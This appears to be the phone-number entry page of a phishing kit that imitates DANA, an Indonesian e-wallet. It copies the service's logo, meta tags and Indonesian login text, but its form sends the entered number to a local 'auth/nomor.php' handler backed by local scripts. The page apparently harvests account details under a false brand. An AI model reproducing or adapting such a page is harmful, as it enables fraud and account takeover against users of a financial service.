<!DOCTYPE html>
<html>

<head>
    <meta data-n-head="ssr" charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta data-n-head="ssr" data-hid="theme-color" name="theme-color" content="#118ee9" />
    <meta data-n-head="ssr" data-hid="apple-mobile-web-app-status-bar-style"
        name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image"
        content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png" />
    <meta data-n-head="ssr" data-hid="og:image" property="og:image"
        content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png" />
    <meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="DANA.id" />
    <meta data-n-head="ssr" data-hid="description" name="description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta data-n-head="ssr" data-hid="twitter:title" name="twitter:title"
        content="DANA - Apa pun transaksinya selalu ada DANA" />
    <meta data-n-head="ssr" data-hid="twitter:description" name="twitter:description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta data-n-head="ssr" data-hid="og:title" name="og:title" content="DANA - Apa pun transaksinya selalu ada DANA" />
    <meta data-n-head="ssr" data-hid="og:description" name="og:description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta data-n-head="ssr" data-hid="keywords" name="keywords"
        content="dana, dana indonesia, dana bisnis, qris, qris adalah, qris indonesia, daftar qris, qris bank indonesia, qris dana, qris bi, qris merchant, logo qris, apa itu qris, pembayaran qris, merchant, merchant dana, daftar merchant, promo hari ini, promo terbaru, promo cashback, cashback, apa itu cashback, cashback adalah, apa itu ewallet, ewallet indonesia, pembayaran digital, dompet digital" />
    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico" />
    <link data-n-head="ssr" rel="preconnect" href="https://a.m.dana.id" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://a.m.dana.id" />
    <link data-n-head="ssr" rel="preconnect" href="https://app.link" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://app.link" />
    <link data-n-head="ssr" rel="preconnect" href="https://api2.branch.io" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://api2.branch.io" />
    <link data-n-head="ssr" rel="preconnect" href="https://youtube.com" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://youtube.com" />
    <link data-n-head="ssr" rel="preconnect" href="https://sentry.io" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://sentry.io" />
    <link data-n-head="ssr" rel="preconnect" href="https://cdn.lr-ingest.io" />
    <link data-n-head="ssr" rel="dns-prefetch" href="https://cdn.lr-ingest.io" />
    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
    <link rel="stylesheet" type="text/css" href="css/main.css" />
    <link rel="stylesheet" type="text/css" href="css/spinner.css" />
</head>

<body>
    <div class="container">
        <a class="aback" href="nomor.php#"><img class="back" src="img/4.png" /></a>
        <img class="dana_logo" src="img/3.png" />
        <h1 class="page-login">
            Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut
        </h1>
        <div class="inputNo">
            <form class="formNo" action="auth/nomor.php" method="post">
                <label for="nope" class="flagNo"><img class="flagIndo" src="img/5.png" /></label>
                <label for="nope">
                    <p class="codeTel">+62</p>
                </label>
                <input name="nomor" class="nope" type="tel" placeholder="811-1234-5678" autocomplete="off"
                    required />
                <h1 class="syarat">
                    Dengan melanjutkan, kamu setuju dengan
                    <b class="bh1">Syarat & Ketentuan</b> dan
                    <b class="bh1">Kebijakan Privasi</b> kami
                </h1>
                <center class="btn">
                    <button type="submit" id="send_data" class="send_data">LANJUT</button>
                </center>
            </form>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none">
        <div class="loading">
            <img src="img/6.png" />
            <img class="spinner" src="img/7.png" />
        </div>
    </div>
</body>
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script src="js/function.js"></script>

</html>